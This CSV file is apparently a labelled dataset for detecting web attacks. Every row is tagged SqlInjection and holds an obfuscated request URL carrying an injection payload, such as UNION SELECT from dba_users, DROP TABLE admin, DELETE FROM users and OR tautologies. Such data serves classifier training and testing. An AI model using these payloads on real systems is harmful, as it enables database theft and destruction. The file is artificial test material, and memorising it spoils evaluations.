id,class,vector
11,SqlInjection,/cdss9uiNbhir9putoDu/cBjtxYssdiNsg3Yetat/eYYEzPiVc/q_.iNv.php3?eogp0Lfl4fl=bulk++insert++++od+++from+++++%27pwdump.exe%27++++++with++%28codepage%3D%27RAW%27++%29&esonRewtqnidqi=hEPFQ
13,SqlInjection,/s9oKWZBqX2K8E8T30nD/ge/9e3masin/o0tf0oddvo8i/ileegoaahnnziepea3/stMNeW3V919/lP9pPU7nZRBGN51Iib/dssimarxex/A9lcel2groKrslhao/s5Rlh8as5no2lntioely/fwjhqfRke.png?hx8passthruopaEV3kZ=vSule3n3meta4plux&hSsGhftrvyecWie=tha7loutgtmei9&p1he2heieeeXe=r4elo0rPanra8+ntft&chnrAuhrsm=ahlicln8l&n8OeOnNelTt8ss=ta&ste0ttsemtodlx=rsl%27++++UNION+++%2F**%2F+++SELECT+tyuheaq3+++++FROM++dba_users++WHERE++euaUtc+++like+++%27%2525&xp_Q5YsHnocatko=lwtlobalosqs2su&n3iJmngBjWP=es-b4&i3mciaajdtsyCA=miNdidocemfeLs&VNwBc=a&5eI1o=7tynhxsi28Ie0pr&boay=i
23,SqlInjection,/sW8FgZhRf5/muni1Xcn1eaudisn/lsC.9/Wiberqdn8tli/datena66zdrir/4eboot.iniHaqN.exe?se=780385
26,SqlInjection,/tigceohedplswW5/I6de/lypAIRYAL7Gzap9RxY/IarowwcQOrftvviowoe/VCBCxtermU@/snR/oRoeni2mteDElngtwn/n1KQW74/rWGsm1_OLh.f2oMmZY@e/NBv45./ECtsruoemTnqvcoT.tiff?hgik49atfld=10291&haSliEtTer3=estm&dgiraeo93qih=ohr9togk&dadcjl=%3At8T&6Oerg59noeytte=%27++++OR+%27ns%27++++BETWEEN+++%27R%27++AND++%27T&qNnetudf=gB5Tmvz%40C&VcNZW4HIa4echo=icowir4eqb&5sE1uancnr=hLgv3t_-YUnS&rehauealIh9a=izcHde%5DytrtnlH7t4d%7C%25&nc7nHaoAwasatc=mnVQI&Uii7c1royl=eqbPVtqq&up=3253203&etbzbbEdweu=70861200&mAsoahgii9p=2iy+&ErZYva-=openeOexec2
49,SqlInjection,eeeat7di=7&pgobaLAhzIeis6=- m h&egbxoe3t=2284&nnEs=fzoTmcDJxY&al2oaxNew=esock_streamnxWiW$osecie7&ep3mIgt=761260&vsBo7u=ljcehpi9caewinnt-E&.MI7nc=';     drop   table admin&netq4wmomeaBcr=99&37hhs=63252
50,SqlInjection,/aa/titIjeoe8hz/6u/e5myEm3/thw/rotb6nqfob.cfm?Etoznhoathtsi=Lentienar&qeedpel6l=6&p0hrnioec=httpsimgn4m7ny&srrlbintsaodn=OR+++++96%3D96&mI7=435&qacRnohseltitg=ed2b&tg=3776&0RcS=nO&t1inry7cmtse=88&uo=9nSteuilmehb
51,SqlInjection,/jAtudat2tAiadIocg/i.zbIZStvoa7C3C/shR8paSX7qf/bEtezimeotqgtei/n1otveoWssrtmbfgny/eewuoioo5rde7/dPZ6dcb/jaiCsitEamieinp/YsLltfweeiUia8/hootmiulalnr9pwqsu7p/aduSnias.php3?re0i=%28cmdiE9AnclrtuE&hkda=aDT7oz9VtIZV&ALDmVscriptz.lnUp=171&nyumoliup6sep=2724984&Spto5s7rRhn=3esvg&is1rhc2=bemr8ymU%27+++%29%3B++DEL%2F**%2FETE++FROM+++users++++WHERE+upper%28username%29++++%3D++upper%28+++%27admin&sgJ=4&streGt=pMKRtZo2mLJ
64,SqlInjection,.pAAqa1-OJ=fsuAsMqt4s&aehrtg2T=527&reESu=ctrtboet&jOctc=tESYs-91&katH5tTiserpsow=autoexecoaon&aare==sstriomEq&sels9hgkn=lexpThe7&oioi=aee/hes&eaiacy6wibl=262603589&zsbXfCFlunion5s='UNIONALLSELECTfieldFROMiealderiroWHERE''='
73,SqlInjection,/gCareeee/shMPyGWyNY0/a6_qXBA7B8aE/hIOv@NSVoKI72Rha/neush3hMad3gayui/MGF/3aGFqKj3O4AwVg3/fTtdwlUynar/OEQHcfkcatpd/eYjIHON@Ke/nPk2CFkuav9/eI6U4vZZx.jsp?otoneornets=3&nmlc=11231&ru0=itQI&dropGHUb=oioniegBtabei6&mpbd=syto9fknO&enako2tfm=83&AmlRenMante=73319&Ieaemftrd=4489481&ge7NyDsBuStcr=nng%5Dnrlikenz%29em&eo=e-UTMGWPx&HnpIqjF=%27select+++++customer_phone+++%27%7C%7C%27from++++customers++%27%7C%7C%27where+++++customer_surname%3D%27%27%27%7C%7C+++++lv_surname%7C%7C%27%27%27++++and+customer_type%3D1%27%3B&petwudlan=vtRddsERonajnil&1xOPEfromJqYu=tx8CR9wQOIdO
81,SqlInjection,_homej.B9accept4X=ie$ heey etc&a9apLeNhae97ts=iheoTlsaformwindow.openAqo&tbRthermld6=158446359&yidSoth8ndj=5~to&suz9=oNee6TieulupCy6&hh8i43thao3=b&wmirnm2oeie33E=cgFdFbj@&ui1rwt=0759913395&hr6rleaeuhsa=uspeohrws4d5eurd&notONrtilesN3rw=9065049&dkdyqnfGeor=X&LUdgttfd6gc7=uetcstrep&a9nqentybr1ujr=8uc&one9sbwiaee=njWiQ0s
